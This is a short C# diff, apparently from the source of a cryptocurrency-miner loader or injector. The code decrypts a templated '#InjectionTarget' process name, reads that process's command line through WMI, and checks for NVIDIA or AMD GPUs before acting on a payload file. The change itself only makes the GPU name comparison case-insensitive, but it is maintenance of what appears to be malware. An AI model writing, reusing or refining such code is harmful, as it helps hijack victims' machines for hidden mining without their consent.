@@ -58,7 +58,7 @@ public partial class RProgram
             var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
-                rarg1 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
+                rarg1 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
             var rarg7 = new ManagementObjectSearcher(rarg5, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#InjectionTarget")))))).Get();
@@ -70,7 +70,7 @@ public partial class RProgram
                 }
             }
 
-            if (!File.Exists(rplp) || (!rarg2 && (rarg1.Contains("nvidia") || rarg1.Contains("amd"))))
+            if (!File.Exists(rplp) || (!rarg2 && (rarg1.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || rarg1.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0)))
             {
                 if (!File.Exists(rplp) || rcheckcount > 2)
                 {
